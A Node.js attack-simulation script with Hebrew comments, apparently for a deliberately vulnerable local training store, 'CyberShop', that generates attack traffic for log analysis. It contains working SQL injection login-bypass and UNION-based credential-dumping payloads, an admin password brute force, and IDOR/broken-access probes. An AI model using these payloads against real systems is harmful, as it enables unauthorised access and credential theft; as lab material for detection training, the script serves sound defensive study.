#!/usr/bin/env node
/**
 * CyberShop — סקריפט סימולציית תקיפות
 * הרצה: node simulation/simulate.js http://localhost:80
 */

const BASE_URL = process.argv[2] || "http://localhost:80";
const DELAY = parseInt(process.env.DELAY_MS || "400");

const c = {
  reset: "\x1b[0m", green: "\x1b[32m", red: "\x1b[31m",
  yellow: "\x1b[33m", blue: "\x1b[34m", cyan: "\x1b[36m",
};

const log = (color, msg) => console.log(`${color}${msg}${c.reset}`);
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function req(method, path, body, jar) {
  const headers = { "Content-Type": "application/json" };
  if (jar?.cookie) headers["Cookie"] = jar.cookie;
  try {
    const r = await fetch(`${BASE_URL}${path}`, {
      method, headers,
      body: body ? JSON.stringify(body) : undefined,
    });
    const setCookie = r.headers.get("set-cookie");
    if (setCookie && jar) jar.cookie = setCookie.split(";")[0];
    const data = await r.json().catch(() => ({}));
    return { status: r.status, data };
  } catch (e) {
    return { status: 0, data: { error: e.message } };
  }
}

async function normalFlow() {
  log(c.blue, "\n=== תנועה רגילה ===");
  const jar = {};
  const username = `user_${Date.now()}`;

  let r = await req("POST", "/api/register", { username, password: "pass123", email: "test@test.com" }, jar);
  log(r.status === 201 ? c.green : c.red, `  [הרשמה] ${r.status}`);
  await sleep(DELAY);

  r = await req("POST", "/api/login", { username, password: "pass123" }, jar);
  log(r.status === 200 ? c.green : c.red, `  [כניסה] ${r.status}`);
  await sleep(DELAY);

  r = await req("GET", "/api/products", null, jar);
  log(r.status === 200 ? c.green : c.red, `  [מוצרים] ${r.status} — ${r.data?.length || 0} מוצרים`);
  await sleep(DELAY);

  r = await req("GET", "/api/products?search=מחשב", null, jar);
  log(r.status === 200 ? c.green : c.red, `  [חיפוש] ${r.status} — ${r.data?.length || 0} תוצאות`);
  await sleep(DELAY);

  const products = (await req("GET", "/api/products", null, jar)).data;
  if (products?.length) {
    const pid = products[0].id;
    r = await req("GET", `/api/products/${pid}`, null, jar);
    log(r.status === 200 ? c.green : c.red, `  [מוצר ${pid}] ${r.status}`);
    await sleep(DELAY);

    r = await req("POST", "/api/orders", { product_id: pid, quantity: 1 }, jar);
    log(r.status === 201 ? c.green : c.red, `  [הזמנה] ${r.status}`);
    await sleep(DELAY);
  }

  r = await req("GET", "/api/orders", null, jar);
  log(r.status === 200 ? c.green : c.red, `  [הזמנות] ${r.status} — ${r.data?.length || 0} הזמנות`);
}

async function sqlInjection() {
  log(c.red, "\n=== SQL INJECTION ===");

  const payloads = [
    ["' OR '1'='1' --", "x"],
    ["admin'--", ""],
    ["' OR 1=1 --", "anything"],
  ];

  for (const [user, pass] of payloads) {
    const r = await req("POST", "/api/login", { username: user, password: pass });
    log(c.yellow, `  [SQLi Login] "${user.slice(0,20)}..." → ${r.status} ${r.data?.user ? "✓ SUCCESS (פגיע!)" : "✗ failed"}`);
    await sleep(DELAY);
  }

  const searchPayloads = [
    "' OR 1=1 --",
    "' UNION SELECT id,username,password,price,stock,image_url,category FROM users --",
  ];
  for (const p of searchPayloads) {
    const r = await req("GET", `/api/products?search=${encodeURIComponent(p)}`);
    log(c.yellow, `  [SQLi Search] ${r.status} — ${r.data?.length ?? 0} תוצאות`);
    await sleep(DELAY);
  }
}

async function bruteForce() {
  log(c.red, "\n=== BRUTE FORCE (כניסה) ===");
  const passwords = ["admin", "123456", "password", "admin123", "qwerty", "letmein"];
  for (const p of passwords) {
    const r = await req("POST", "/api/login", { username: "admin", password: p });
    const ok = r.status === 200;
    log(ok ? c.red : c.yellow, `  [Brute] admin:${p} → ${r.status} ${ok ? "✓ SUCCESS!" : "✗"}`);
    await sleep(100);
  }
}

async function idor() {
  log(c.red, "\n=== IDOR + Broken Access Control ===");

  const r = await req("GET", "/api/admin/users");
  log(c.yellow, `  [Admin Users] ${r.status} — ${r.data?.length || 0} משתמשים (ללא הרשאות!)`);
  if (r.data?.length) {
    r.data.slice(0, 3).forEach(u => log(c.red, `    → ${u.username}:${u.password}`));
  }
  await sleep(DELAY);

  for (let id = 1; id <= 5; id++) {
    const res = await req("GET", `/api/orders?user_id=${id}`);
    log(c.yellow, `  [IDOR Orders] user_id=${id} → ${res.status} — ${res.data?.length || 0} הזמנות`);
    await sleep(100);
  }
}

async function main() {
  log(c.blue, `\nCyberShop Attack Simulation`);
  log(c.blue, `Target: ${BASE_URL} | ${new Date().toLocaleString("he-IL")}`);
  log(c.blue, "=".repeat(50));

  await normalFlow();
  await sleep(500);
  await sqlInjection();
  await sleep(500);
  await bruteForce();
  await sleep(500);
  await idor();

  log(c.green, "\n=== הסימולציה הושלמה ===");
  log(c.cyan, "בדוק את הלוגים ב: backend/logs/app.log");
}

main().catch(console.error);
